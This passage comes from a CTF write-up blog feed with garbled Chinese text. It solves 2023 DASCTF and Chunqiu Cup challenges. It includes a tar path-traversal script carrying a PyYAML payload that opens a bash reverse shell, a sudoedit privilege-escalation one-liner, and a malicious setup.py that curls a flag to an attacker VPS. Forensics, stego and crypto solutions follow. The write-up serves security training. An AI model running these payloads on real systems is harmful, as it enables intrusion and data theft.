tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>å¼€å§‹ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œæ ¹æ®æºç çŸ¥ <code>upload</code> è·¯ç”±çŸ¥å½“ä¸Šä¼ taråç¼€çš„æ–‡ä»¶æ—¶ï¼Œå›æ‰§è¡Œè§£å‹ä»£ç ï¼Œå°†æ–‡ä»¶è§£å‹åˆ°uploadsç›®å½•ä¸‹ï¼Œåˆ©ç”¨tarç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå°†æ–‡ä»¶è§£å‹åˆ°configç›®å½•ä¸‹ï¼Œé…åˆä¸‹ä¸€æ­¥ <code>src</code> è·¯ç”±åŠŸèƒ½ä¸­å­˜åœ¨çš„PyYAMLæ¼æ´ï¼ˆCVE-2020-1747ï¼‰ï¼Œå®ç°RCEã€‚</p><p>ç”Ÿæˆtaræ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">tar = tarfile.TarFile(<span class="string">r&#x27;1.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info = tarfile.TarInfo(<span class="string">&quot;../../config/my.yaml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åå¼¹shell</span></span><br><span class="line">deserialization_payload = <span class="string">&quot;&quot;&quot;!!python/object/apply:os.system [&#x27;bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">info.size=<span class="built_in">len</span>(deserialization_payload)</span><br><span class="line">info.mode=<span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">tar.addfile(info, io.BytesIO(deserialization_payload.encode()))</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ï¼Œå›æ˜¾è§£å‹åˆ° <code>../../config/my.yaml</code>ï¼Œ<code>my.yaml</code> å·²åœ¨configç›®å½•ä¸‹ï¼Œå†è®¿é—® <code>/src?username=my</code> åå¼¹shellæˆåŠŸï¼Œæ‰§è¡Œ <code>cat /fllaagg_here</code> å¾—åˆ°flagï¼š<code>DASCTF&#123;13247551631744504376506324559899&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h3><blockquote><p>Letâ€™s Go!! </p></blockquote><p>goè¯­è¨€ç¨‹åºï¼Œæ‰¾åˆ°æœ€åæ¯”è¾ƒçš„base64å¯†æ–‡ä¸ºï¼š</p><p><code>cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/=</code></p><p>åŠ¨è°ƒåŠ å¯†å‡½æ•° <code>fkReverse_()</code> ï¼Œåœ¨ç è¡¨å˜é‡ <code>fkReverse</code> å¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•å¾—å®é™…ç è¡¨ï¼š</p><p><code>LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK</code></p><p>base64è§£å¯†å¾—flagï¼š<code>DASCTF&#123;73913519-A0A6-5575-0F10-DDCBF50FA8CA&#125;</code>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ç«èµ›æ—¶é—´&lt;/p&gt;
&lt;p&gt;2023-09-02 09:00:00~2023-09-03 09:00:00&lt;/p&gt;
&lt;p&gt;ç«èµ›ç®€ä»‹&lt;/p&gt;
&lt;p&gt;ç›®å‰æˆ‘å›½ç½‘æ°‘è§„æ¨¡å·²çªç ´9äº¿ï¼Œæˆä¸ºåå‰¯å…¶å®çš„ç½‘ç»œå¤§å›½ï¼Œä½†æˆ‘å›½ä¸ç½‘ç»œå¼ºå›½ç›¸æ¯”è¿˜æœ‰ä¸€å®šè·ç¦»ã€‚ä¹ è¿‘å¹³æ€»ä¹¦è®°æŒ‡å‡ºï¼šè¦</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ› æ˜¥å­£èµ›</title>
    <link href="https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/</id>
    <published>2023-05-19T10:13:55.000Z</published>
    <updated>2023-06-04T16:24:22.895Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ›ï¼Œå°†æ›´åŠ æ·±åŒ–äººæ‰åŸ¹å…»çš„æ„ä¹‰ï¼Œç»™äºˆæ–°ç”Ÿä»£é€‰æ‰‹æ›´å¤§çš„èˆå°ï¼Œæœ¬æ¬¡æ¯”èµ›ç‰¹å°†æ—¶é•¿å»¶é•¿è‡³7å¤©ï¼Œç›¸å¯¹äºä»¥å¾€çš„æ¯”èµ›ï¼Œè¿™æ˜¯ä¸€æ¬¡å‰æ‰€æœªæœ‰çš„å°è¯•ã€‚åŒæ—¶ï¼Œèµ›é¢˜éš¾åº¦åˆ†å¸ƒæ›´åŠ åˆç†å‡è¡¡ï¼Œé¢˜ç›®è´¨é‡ä¾æ—§å€¼å¾—è®©äººæœŸå¾…ã€‚é¢˜ç›®è®¾è®¡æ¶µç›–äº†å¤šä¸ªæ–¹é¢çš„å®‰å…¨æŠ€æœ¯ï¼Œèµ›é¢˜è€ƒé¢˜èŒƒå›´åŒ…æ‹¬Web æ¼æ´ä¸æ¸—é€(Web)ï¼Œè½¯ä»¶é€†å‘ (Reverse Engineering)ï¼ŒäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨(PWN)ï¼Œå¯†ç å­¦ï¼ˆcryptoï¼‰ï¼Œä¸æ‚é¡¹ï¼ˆMiscï¼‰äº”å¤§ç±»å‹ï¼Œä¸”æ¯ä¸ªæ–¹å‘æ¯å¤©å„æ”¾ä¸€é“é¢˜ç›®ï¼ˆç¬¬ä¸ƒå¤©ä¸æ”¾é¢˜ï¼‰ã€‚åŒæ—¶æˆ‘ä»¬è¿˜åŠ å…¥äº†å½©è›‹é¢˜ç›®ï¼Œå¸Œæœ›å„ä½å‚èµ›é€‰æ‰‹ç©çš„å¼€å¿ƒï¼Œåœ¨æ¯”èµ›ä¸­å¯ä»¥æœ‰æ‰€æ”¶è·ï¼Œå¸Œæœ›é€šè¿‡æ˜¥ç§‹æ¯èƒ½å¤Ÿè®©å„ä½æ„Ÿå—åˆ°æ¯”èµ›çš„ä¹è¶£ä»¥åŠæ˜¥ç§‹GAMEçš„ç”¨å¿ƒï¼Œæ¬¢è¿å„ä½å¸ˆå‚…å‰æ¥æŒ‘æˆ˜ã€‚ä¸ºä½¿æ¯”èµ›æ›´çº¯ç²¹ï¼Œæ›´å…¬å¹³ï¼Œæ›´é«˜è´¨é‡ï¼Œæˆ‘ä»¬å–æ¶ˆäº†å¥–é‡‘å¥–åŠ±ï¼Œå¹¶é…å¤‡äº†äº”å¤§æ–¹å‘çš„é«˜è´¨é‡èµ›é¢˜ã€‚æ²¡æœ‰ååˆ©ï¼Œæ›´åŠ å…¬å¹³ï¼Œå……åˆ†è€ƒå¯Ÿé€‰æ‰‹çš„ç»¼åˆèƒ½åŠ›ã€‚</p><p><strong>Rank: 13</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><blockquote><p>å°æ¥ æ¥ æ˜¯ä¸€ä¸ªçƒ­çˆ±æŠ€æœ¯çš„å°å§‘å¨˜ï¼Œæœ€è¿‘å¼€å§‹å­¦ä¹ Linuxç³»ç»Ÿä¸­çš„sudoå‘½ä»¤ï¼Œå¸Œæœ›èƒ½å¤Ÿæ›´å¥½åœ°ç®¡ç†ç³»ç»Ÿã€‚ç„¶è€Œï¼Œå¥¹å¹¶ä¸çŸ¥é“åœ¨ä½¿ç”¨sudoæ—¶å­˜åœ¨ç€æ½œåœ¨çš„ç½‘ç»œå®‰å…¨éšæ‚£ï¼Œè¿™å¯èƒ½ä¼šç»™ç³»ç»Ÿå¸¦æ¥ä¸å¿…è¦çš„é£é™©ã€‚å› æ­¤ï¼Œå¥¹å†³å®šè¿›ä¸€æ­¥å­¦ä¹ æœ‰å…³ç½‘ç»œå®‰å…¨çš„çŸ¥è¯†ï¼Œä»¥æ›´å¥½åœ°ä¿æŠ¤ç³»ç»Ÿå’Œæ•°æ®çš„å®‰å…¨ã€‚å°æ¥ æ¥ ç›¸ä¿¡ï¼Œåªæœ‰ä¸æ–­å­¦ä¹ å’Œæé«˜è‡ªå·±çš„æŠ€èƒ½ï¼Œæ‰èƒ½æˆä¸ºä¸€åçœŸæ­£çš„æŠ€æœ¯ä¸“å®¶ã€‚</p></blockquote><p>sshè¿æ¥ä¸Šï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flagï¼Œä½†éœ€è¦rootæƒé™ï¼Œæ ¹æ®é¢˜ç›®æè¿°åº”è¯¥ä¸ºsudoææƒï¼Œå‚è€ƒ <a href="https://blog.csdn.net/weixin_46944519/article/details/129971508">ã€æƒé™æå‡ã€‘Linux Sudoæƒé™æå‡æ¼æ´(CVE-2023-22809)</a>ã€‚</p><p><code>sudo -l</code> æŸ¥çœ‹NOPASSWDç‰¹æ®Šæƒé™ï¼ˆå¯¹åº” <code>/etc/sudoer.d</code> æ–‡ä»¶ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for xiaonannan on engine-1:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User xiaonannan may run the following commands on engine-1:</span><br><span class="line">    (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB</span><br></pre></td></tr></table></figure><p>æ•… <code>/etc/GAMELAB</code> æœ‰ç‰¹æ®Šæƒé™ï¼Œè€Œç¯å¢ƒæ— vimæœ‰nanoï¼Œå°è¯•payloadï¼š</p><p><code>EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB</code></p><p>å³å¯åœ¨nanoç¼–è¾‘æ¨¡å¼ä¸‹å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="piphack"><a href="#piphack" class="headerlink" title="piphack"></a>piphack</h3><blockquote><p>å¯ä»¥å®‰è£…ä»»æ„åŒ…çš„æ¥å£ï¼Œä½ ä¼šæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p></blockquote><p>ç»™äº†ä¸€ä¸ªå¯ä»¥å®‰è£…ä»»æ„åŒ…çš„æ¥å£ï¼Œå¯»æ‰¾åˆ°pipç›¸å…³çš„ææƒæ–¹æ³•ï¼š<a href="https://www.cnblogs.com/zlgxzswjy/p/10245977.htmlï¼Œå‚ç…§ç€FakePipçš„æ–¹æ³•åˆ¶ä½œ">https://www.cnblogs.com/zlgxzswjy/p/10245977.htmlï¼Œå‚ç…§ç€FakePipçš„æ–¹æ³•åˆ¶ä½œ</a> <code>setup.py</code> å¹¶æ‰“åŒ…æˆwhlæ–‡ä»¶æ”¾åˆ°vpsä¸Šï¼Œä½†æ€ä¹ˆè¯•ä¹Ÿæ²¡æˆåŠŸåå¼¹shellã€‚</p><p>å°è¯•å‡ºç”¨å¦ä¸€ç§gitæ–¹æ³•åŒæ ·å¯ä»¥ä»åº“ä¸­æ‹‰å–æ¶æ„è„šæœ¬è¯»å–flagã€‚</p><p>åœ¨vpsä¸Šç”¨pythonæ­å»ºæœåŠ¡å™¨ï¼š<code>python3 -m http.server 10010</code></p><p>åˆ¶ä½œæ¶æ„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">os.system(<span class="string">&#x27;curl http://vps-ip:10010?&#x27;</span>+f)</span><br></pre></td></tr></table></figure><p>æ”¾åˆ°giteeæ–°å»ºçš„ä»“åº“é‡Œï¼Œå†å®‰è£…ä»»æ„åŒ…çš„è¾“å…¥å‡ºè¾“å…¥ï¼š<code>git+https://gitee.com/lazzzaro/test.git</code></p><p>å³å¯è¿è¡Œåº“é‡Œçš„ <code>setup.py</code>ï¼Œåœ¨vpså†…å¯ä»¥çœ‹åˆ°å¤–å¸¦çš„flagï¼š</p><p><img src="/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/image-20230519191149050.png" alt="image-20230519191149050"></p><p>â€‹    </p><h3 id="wordle"><a href="#wordle" class="headerlink" title="wordle"></a>wordle</h3><blockquote><p>åšé¢˜ç´¯äº†ï¼Œä¸å¦‚è·Ÿå°æ¥ æ¥ ä¸€èµ·æ¥ç©ä¸€ä¸ªwordleæ¸¸æˆï¼Œè¾¹ç©è¾¹å­¦è‹±æ–‡ï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚</p><p>ï¼ˆçº¯æ¸¸æˆï¼Œé€šå…³å³æ‹¿flagï¼‰</p></blockquote><p>wordleçŒœè¯æ¸¸æˆï¼Œ6æ¬¡å†…çŒœå¯¹ä¸€ä¸ª5å­—æ¯å•è¯å³å¯æ‹¿åˆ°flagã€‚é€åˆ†ã€‚</p><p>â€‹    </p><h3 id="happy2forensics"><a href="#happy2forensics" class="headerlink" title="happy2forensics"></a>happy2forensics</h3><blockquote><p>å°æ¥ æ¥ æ˜æ˜çœ‹åˆ°äº†flagï¼Œæ€ä¹ˆæ‰“å¼€æ–‡ä»¶å´æ‰¾ä¸åˆ°å‘¢?</p></blockquote><p>æŸ¥çœ‹æµé‡åŒ…é‡Œhttpå¯¹è±¡ï¼Œå¯¼å‡º <code>secret.rar</code>ï¼Œè§£å‹å‡º <code>secret.vhdx</code>ï¼Œæ˜¯ä¸€ä¸ªbitlockeråŠ å¯†çš„ç£ç›˜ã€‚</p><p>æ ¹æ®å®˜æ–¹æç¤ºæ•è·æºç«¯å£ä¸º20ï¼Œç›®çš„ç«¯å£ä¸º80çš„TCPæµé‡ï¼Œå¯ä»¥è·å¾—bitlockerå¯†ç ï¼š</p><p><code>bitlocker 120483-350966-299189-055297-225478-133463-431684-359403</code></p><p>åœ¨å›æ”¶ç«™æ‰¾åˆ° <code>flag2.zip</code> ä½†éœ€è¦å¯†ç ã€‚</p><p>å°†æ‰€æœ‰å°å›¾ç‰‡æ‹¼æ¥å¾—åˆ° <code>password: 856a-a56b6a705653</code>ï¼Œè§£å‹ <code>flag2.zip</code> å¾—åˆ° <code>flag2:-919c-a140d7054ac5</code>ã€‚</p><p>ä¸€å †å°å›¾ç‰‡ä¸­æœ‰ä¸€ä¸ªä¸ä¸€æ ·å¤§å°çš„å›¾ç‰‡ <code>210-1.png</code>ï¼Œbinwalkåˆ†è§£ï¼Œåˆ†è§£å‡ºçš„jpgçš„APP1å—é‡Œè—æœ‰å¦ä¸€ä¸ª <code>FFD8</code> å¤´ï¼Œæå–å‡ºæ–°çš„jpgï¼Œå¾—åˆ° <code>flag1:f97d5b05-d312-46ac</code>ã€‚</p><p>åˆå¹¶ï¼Œflagï¼š<code>flag&#123;f97d5b05-d312-46ac-919c-a140d7054ac5&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç›²äººéšè—äº†èµ·æ¥"><a href="#ç›²äººéšè—äº†èµ·æ¥" class="headerlink" title="ç›²äººéšè—äº†èµ·æ¥"></a>ç›²äººéšè—äº†èµ·æ¥</h3><p>12å’Œ34åšå¯¹æ¯”ï¼Œå‘ç°12ç›¸æ¯”34å°‘äº†38ä¸ªå­—èŠ‚ï¼Œå¯¹ç…§è¡¥å……å­—èŠ‚æ‰“å¼€12.mp4ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š<code>ChunJiSai7k7kbibi@!</code>ã€‚</p><p>è§£å‹ <code>flag.zip</code> å¾—åˆ° <code>flag.png</code>ï¼Œåœ¨å°¾éƒ¨å‘ç° <code>keyischunqiu123</code>ï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡çš„lsbï¼Œå‘ç°åœ¨ <code>b1,bgr,lsb,xy</code> å¯ä»¥ç›´æ¥çœ‹åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b1,bgr,lsb,xy       .. &lt;wbStego size=84, ext=&quot;\x00fl&quot;, data=&quot;ag&#123;2c8ba89&quot;..., even=false&gt;</span><br><span class="line">    00000000: 54 00 00 00 66 6c 61 67  7b 32 63 38 62 61 38 39  |T...flag&#123;2c8ba89|</span><br><span class="line">    00000010: 37 2d 30 32 30 35 2d 39  62 66 66 2d 31 32 33 64  |7-0205-9bff-123d|</span><br><span class="line">    00000020: 2d 32 38 31 64 31 32 61  32 34 63 33 38 7d ff ff  |-281d12a24c38&#125;..|</span><br><span class="line">    00000030: ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;2c8ba897-0205-9bff-123d-281d12a24c38&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="58ä¸64"><a href="#58ä¸64" class="headerlink" title="58ä¸64"></a>58ä¸64</h3><blockquote><p>å¥½å¤šæ–‡ä»¶..å¾—æƒ³åŠæ³•æŠŠä»–ä»¬å¼„åœ¨ä¸€èµ·</p></blockquote><p>14268ä¸ªtxtæ–‡ä»¶ï¼Œæ¯ä¸ªtxtæ–‡ä»¶å†…ä¿å­˜çš„ä¸ºbase58ç»“æœï¼Œè§£ç åå†è¿æ¥æˆå­—ç¬¦ä¸²ï¼Œå¤šæ¬¡base64è§£ç å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14268</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;tmp/<span class="subst">&#123;i&#125;</span>.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readline().strip()</span><br><span class="line">    s += base58.b58decode(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>æ¥ç­¾åˆ°å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit</span>):</span><br><span class="line">    p, q = [getPrime(nbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = keygen(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">len</span>(flag)//<span class="number">2</span></span><br><span class="line">part1 = bytes_to_long(flag[:t])</span><br><span class="line">part2 = bytes_to_long(flag[t:])</span><br><span class="line"></span><br><span class="line">D = <span class="number">1117</span></span><br><span class="line">x = </span><br><span class="line">y = </span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">enc1 = <span class="built_in">pow</span>(<span class="number">233</span> * n ** <span class="number">2</span> + <span class="number">1</span>, part1, n ** <span class="number">3</span>)</span><br><span class="line">enc2 = <span class="built_in">pow</span>(y * n + <span class="number">1</span>, part2, n ** <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc1 = 